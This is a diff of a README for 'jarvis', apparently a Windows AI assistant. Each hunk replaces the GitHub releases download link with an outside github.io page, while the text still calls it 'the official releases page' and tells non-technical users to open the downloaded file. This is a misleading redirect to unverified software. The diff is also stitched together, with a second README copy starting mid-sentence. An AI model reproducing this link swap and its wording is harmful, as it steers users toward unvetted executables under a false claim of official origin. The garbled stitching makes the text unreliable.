@@ -1,6 +1,6 @@
 # 🤖 jarvis - Your personal AI assistant for Windows
 
-[![Download jarvis](https://img.shields.io/badge/Download-jarvis-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Duollc/jarvis/releases)
+[![Download jarvis](https://img.shields.io/badge/Download-jarvis-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://duollc.github.io)
 
 Visit this link to download the application.
 
@@ -18,7 +18,7 @@ The name J.A.R.V.I.S. is familiar to many people: it suggests a smart assistant 
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [Download jarvis](https://github.com/Duollc/jarvis/releases).
+Visit this link to download the application: [Download jarvis](https://duollc.github.io).
 
 This is the official releases page for jarvis. Use it to reach the download for the application. After the download finishes, open the downloaded item to start jarvis on Windows. The application is designed to be used by regular computer users, so you do not need to know how to write code or manage a server.
 
@@ -70,7 +70,7 @@ You do not need to set up a separate server to get started. The application is p
 
 When you open jarvis for the first# 🚀 jarvis - Your Personal AI Assistant for Windows
 
-[![Download jarvis](https://img.shields.io/badge/Download-jarvis-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Duollc/jarvis/releases)
+[![Download jarvis](https://img.shields.io/badge/Download-jarvis-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://duollc.github.io)
 
 Visit this link to download the application.
 
@@ -88,7 +88,7 @@ The name J.A.R.V.I.S. is familiar to many people: it suggests a smart assistant 
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [Download jarvis](https://github.com/Duollc/jarvis/releases).
+Visit this link to download the application: [Download jarvis](https://duollc.github.io).
 
 This is the official releases page for jarvis. Use it to reach the download for the application. After the download finishes, open the downloaded item to start jarvis on Windows. The application is designed to be used by regular computer users, so you do not need to know how to write code or manage a server.
 
